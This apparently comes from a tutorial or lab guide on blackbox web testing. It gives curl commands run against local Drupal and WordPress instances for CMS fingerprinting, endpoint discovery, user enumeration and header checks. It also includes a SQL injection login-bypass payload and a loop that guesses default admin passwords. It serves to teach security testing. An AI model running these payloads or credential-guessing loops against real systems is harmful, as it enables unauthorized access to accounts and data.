What is Blackbox Testing?
─────────────────────────────────────────────────────────────────────────

Blackbox testing simulates an external attacker with:
  ✗ NO source code access
  ✗ NO database access
  ✗ NO system configuration knowledge
  ✓ ONLY external HTTP/network access

This represents real-world attacking scenarios where the attacker must
discover vulnerabilities through reconnaissance and manual testing.

TESTING TECHNIQUES - MANUAL EXAMPLES
═══════════════════════════════════════════════════════════════════════════════

1. CMS Fingerprinting (Without Internal Knowledge)
──────────────────────────────────────────────────────────────────────────

$ curl -s http://localhost:8001/ | grep -io "drupal\|wordpress\|joomla"

$ curl -s http://localhost:8001/CHANGELOG.txt | head -1

$ curl -s http://localhost:8001/ | grep -o "sites/all/modules\|wp-content"

Expected Output: Identifies CMS type by external indicators

2. Endpoint Discovery
──────────────────────────────────────────────────────────────────────────

$ for path in admin user login register api; do
    echo -n "$path: "
    curl -s -o /dev/null -w "%{http_code}" http://localhost:8001/$path
  done

Expected Output: Lists available endpoints with HTTP status codes

3. SQL Injection Testing
──────────────────────────────────────────────────────────────────────────

$ curl -X POST http://localhost:8001/user/login \
  -d "name=' OR '1'='1&pass=test" \
  -H "Content-Type: application/x-www-form-urlencoded"

Expected Output: Bypass authentication if vulnerable

4. API Enumeration
──────────────────────────────────────────────────────────────────────────

$ curl http://localhost:8001/jsonapi/user/user | jq '.'
$ curl http://localhost:8002/wp-json/wp/v2/users | jq '.'

Expected Output: Lists users without authentication

5. Weak Credentials Detection
──────────────────────────────────────────────────────────────────────────

$ for pass in admin 123456 password; do
    curl -s -X POST http://localhost:8001/user/login \
      -d "name=admin&pass=$pass" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      | grep -q "logout" && echo "Found: admin:$pass"
  done

Expected Output: Identifies weak default credentials

6. Information Disclosure
──────────────────────────────────────────────────────────────────────────

$ curl -s http://localhost:8001/admin | grep -i "error\|exception\|warning"

Expected Output: Reveals system information through error messages

7. HTTP Security Headers
──────────────────────────────────────────────────────────────────────────

$ curl -I http://localhost:8001 | grep -i "x-content\|x-frame\|csp"

Expected Output: Lists missing security headers
